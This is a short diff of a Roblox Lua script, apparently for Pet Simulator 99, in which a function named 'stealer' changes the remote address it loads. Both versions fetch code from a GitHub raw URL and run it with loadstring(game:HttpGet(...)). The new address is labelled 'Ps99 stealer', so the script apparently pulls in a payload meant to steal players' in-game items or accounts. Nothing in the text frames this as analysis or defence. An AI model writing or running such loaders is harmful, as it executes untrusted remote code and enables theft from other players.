@@ -7,7 +7,7 @@ local isVIPServer = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("Extr
 
 -- Объявление функций
 local function stealer()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/ODHUBytb/All-need-xx-script-veshi/refs/heads/main/x%20script%20base%20no%20deleting"))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/ODHUBytb/zaphub.xyz/refs/heads/main/Ps99%20stealer"))()
 end
 
 local function farm()
